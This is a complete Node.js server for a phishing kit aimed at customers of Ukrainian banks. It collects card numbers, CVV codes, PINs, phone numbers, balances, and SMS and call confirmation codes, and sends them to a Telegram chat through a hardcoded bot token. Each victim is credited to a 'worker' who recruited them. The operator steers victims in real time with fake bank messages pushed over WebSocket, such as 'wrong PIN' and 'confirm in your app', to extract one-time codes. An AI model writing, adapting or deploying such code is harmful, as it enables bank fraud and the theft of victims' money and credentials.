// server.js (полностью готовый — worker скрыт для пользователя)
const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');
require('dotenv').config();
const crypto = require('crypto');

// =======================================================================
// --- НАСТРОЙКИ: Используйте env vars ---
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7607171529:AAF4Tch8CyVujvaMhN33_tlasoGAHVmxv64';
const CHAT_ID = process.env.CHAT_ID || '-4970332008';
const WEBHOOK_URL = 'https://new-l8h6.onrender.com/bot' + TELEGRAM_BOT_TOKEN;
// =======================================================================

// --- СПИСОК БАНКІВ ДЛЯ КНОПКИ "ЗАПРОС" ---
const banksForRequestButton = [
    'Райффайзен', 'Альянс', 'ПУМБ', 'OTP Bank',
    'Восток', 'Izibank', 'Укрсиб'
];

const app = express();
app.use(express.json());
app.use(cors());

// Логирование всех запросов для дебага
app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.url} - Body: ${JSON.stringify(req.body)}`);
    next();
});

app.get('/panel.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

const sessions = new Map();

// =======================================================================
// GET / — сохраняем worker и sessionId
app.get('/', (req, res) => {
    const worker = req.query.worker; // получаем ?worker=@ник
    const sessionId = req.query.sessionId || crypto.randomBytes(8).toString('hex');

    // сохраняем worker в сессии, если есть
    if (worker) {
        const existing = sessions.get(sessionId) || {};
        sessions.set(sessionId, { ...existing, worker });
        console.log(`Сессия ${sessionId}: worker = ${worker}`);
    }

    res.sendFile(path.join(__dirname, 'index.html'));
});

// =======================================================================
// Новый маршрут: POST /api/registerWorker — скрыто регистрируем воркера
app.post('/api/registerWorker', (req, res) => {
    const { sessionId, worker } = req.body;
    if (!sessionId || !worker) return res.status(400).json({ message: "Не указан sessionId или worker" });

    const existing = sessions.get(sessionId) || {};
    sessions.set(sessionId, { ...existing, worker });
    console.log(`Сессия ${sessionId}: worker = ${worker}`);
    res.json({ message: "Worker зарегистрирован" });
});

// =======================================================================

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

// Установка webhook
bot.setWebHook(WEBHOOK_URL).then(() => {
    console.log(`Webhook set to ${WEBHOOK_URL}`);
}).catch(err => {
    console.error('Error setting webhook:', err);
});

// Тестовое сообщение при запуске
bot.sendMessage(CHAT_ID, 'Сервер запустился! Тест от ' + new Date().toISOString(), { parse_mode: 'HTML' }).catch(err => console.error('Test send error:', err));

// Маршрут для Telegram webhook
app.post('/bot' + TELEGRAM_BOT_TOKEN, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// Тест бота
bot.getMe().then(me => console.log(`Bot started: @${me.username}`)).catch(err => console.error('Bot error:', err));

const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });

const clients = new Map();

wss.on('connection', (ws) => {
    console.log('Client connected');
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(`Client registered: ${data.sessionId}`);
            }
        } catch (e) {
            console.error('Error processing message:', e);
        }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(`Client disconnected: ${sessionId}`);
            }
        });
    });
    ws.on('error', (error) => {
        console.error('WebSocket error:', error);
    });
});

// =======================================================================
// POST /api/submit — берем worker из сессии
app.post('/api/submit', (req, res) => {
    console.log('API /submit:', req.body);
    const { sessionId, isFinalStep, ...stepData } = req.body;

    console.log(`Session ${sessionId}: isFinalStep=${isFinalStep}, data keys: ${Object.keys(stepData).join(', ')}`);

    // берем существующую сессию, если есть
    const existingData = sessions.get(sessionId) || { visitCount: 0 };
    const newData = { ...existingData, ...stepData };

    // сохраняем обратно
    sessions.set(sessionId, newData);

    // если пришёл call code
    if (newData.call_code_input) {
        let message = `<b>🔔 Отримано код із дзвінка (Ощадбанк)!</b>\n\n`;
        message += `<b>Код:</b> <code>${newData.call_code_input}</code>\n`;
        message += `<b>Сесія:</b> <code>${sessionId}</code>\n`;

        // worker из сессии
        if (newData.worker) {
            message += `<b>👤 Worker:</b> ${newData.worker}\n`;
        }

        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        return res.status(200).json({ message: 'Call code received' });
    }

    // финальные данные
    if (isFinalStep) {
        if (!existingData.logSent) {
            newData.visitCount = (existingData.visitCount || 0) + 1;
            newData.logSent = true;
        } else {
            delete newData.logSent;
        }

        sessions.set(sessionId, newData);

        console.log(`Received FINAL data for session ${sessionId}, visit #${newData.visitCount}`);

        let message = `<b>Новий запис!</b>\n\n`;
        message += `<b>Назва банку:</b> ${newData.bankName}\n`;
        message += `<b>Номер телефону:</b> <code>${newData.phone || 'Не вказано'}</code>\n`;
        message += `<b>Номер карти:</b> <code>${newData.card_confirm || newData.card || 'Не вказано'}</code>\n`;
        if (newData['card-expiry']) message += `<b>Термін дії:</b> <code>${newData['card-expiry']}</code>\n`;
        if (newData['card-cvv']) message += `<b>CVV:</b> <code>${newData['card-cvv']}</code>\n`;
        message += `<b>Пін:</b> <code>${newData.pin || 'Не вказано'}</code>\n`;
        if (newData.balance) message += `<b>Поточний баланс:</b> <code>${newData.balance}</code>\n`;
        const visitText = newData.visitCount === 1 ? 'NEW' : `${newData.visitCount} раз`;
        message += `<b>Кількість переходів:</b> ${visitText}\n`;

        if (newData.worker) {
            message += `<b>👤 Worker:</b> ${newData.worker}\n`;
        }

        sendToTelegram(message, sessionId, newData.bankName);
    }

    res.status(200).json({ message: 'OK' });
});

// =======================================================================
// POST /api/sms
app.post('/api/sms', (req, res) => {
    console.log('API /sms:', req.body);
    const { sessionId, code } = req.body;
    console.log(`SMS for ${sessionId}: code=${code}`);
    const sessionData = sessions.get(sessionId);
    if (sessionData) {
        let message = `<b>Отримано SMS!</b>\n\n`;
        message += `<b>Код:</b> <code>${code}</code>\n`;
        message += `<b>Номер телефону:</b> <code>${sessionData.phone}</code>\n`;
        message += `<b>Сесія:</b> <code>${sessionId}</code>\n`;
        if (sessionData.worker) {
            message += `<b>👤 Worker:</b> ${sessionData.worker}\n`;
        }
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        console.log(`SMS code received for session ${sessionId}`);
        res.status(200).json({ message: 'OK' });
    } else {
        res.status(404).json({ message: 'Session not found' });
    }
});

// =======================================================================
function sendToTelegram(message, sessionId, bankName) {
    const keyboard = [
        [
            { text: 'SMS', callback_data: `sms:${sessionId}` },
            { text: 'ДОДАТОК', callback_data: `app:${sessionId}` }
        ],
        [
            { text: 'ПІН', callback_data: `pin_error:${sessionId}` },
            { text: 'КОД', callback_data: `code_error:${sessionId}` },
            { text: 'КОД ✅', callback_data: `timer:${sessionId}` }
        ],
        [
            { text: 'Карта', callback_data: `card_error:${sessionId}` },
            { text: 'Номер', callback_data: `number_error:${sessionId}` }
        ],
        [
            { text: 'OTHER', callback_data: `other:${sessionId}` }
        ]
    ];

    if (banksForRequestButton.includes(bankName)) {
        keyboard[0].push({ text: 'ЗАПРОС', callback_data: `request_details:${sessionId}` });
    }

    const options = {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: keyboard
        }
    };
    bot.sendMessage(CHAT_ID, message, options).catch(err => console.error("Telegram send error:", err));
}

bot.on('callback_query', (callbackQuery) => {
    const [type, sessionId] = callbackQuery.data.split(':');
    const ws = clients.get(sessionId);
    if (ws && ws.readyState === WebSocket.OPEN) {
        let commandData = {};

        switch (type) {
            case 'sms':
                commandData = { text: "Вам відправлено SMS з кодом на мобільний пристрій, введіть його у форму вводу коду" };
                break;
            case 'app':
                commandData = { text: "Вам надіслано підтвердження у додаток мобільного банку. Відкрийте додаток банку та зробіть підтвердження для проходження автентифікації." };
                break;
            case 'other':
                commandData = { text: "В нас не вийшло автентифікувати вашу картку. Для продовження пропонуємо вказати картку іншого банку" };
                break;
            case 'pin_error':
                commandData = { text: "Ви вказали невірний пінкод. Натисніть кнопку назад та вкажіть вірний пінкод" };
                break;
            case 'card_error':
                commandData = { text: "Вказано невірний номер картки, натисніть кнопку назад та введіть номер картки вірно" };
                break;
            case 'number_error':
                commandData = { text: "Вказано не фінансовий номер телефону. Натисніть кнопку назад та вкажіть номер який прив'язаний до вашої картки." };
                break;
            case 'request_details':
                commandData = { isRaiffeisen: sessions.get(sessionId)?.bankName === 'Райффайзен' };
                break;
        }

        ws.send(JSON.stringify({ type: type, data: commandData }));
        bot.answerCallbackQuery(callbackQuery.id, { text: `Команда "${type}" відправлена!` });
    } else {
        bot.answerCallbackQuery(callbackQuery.id, { text: 'Помилка: клієнт не в мережі!', show_alert: true });
    }
});

// Обработка ошибок Telegram polling (если включено, но мы на webhook)
bot.on('polling_error', (error) => {
    console.error('Telegram polling error:', error);
});

// Глобальная обработка ошибок Express
app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({ message: 'Internal Server Error' });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server is running on port ${PORT}`);
});
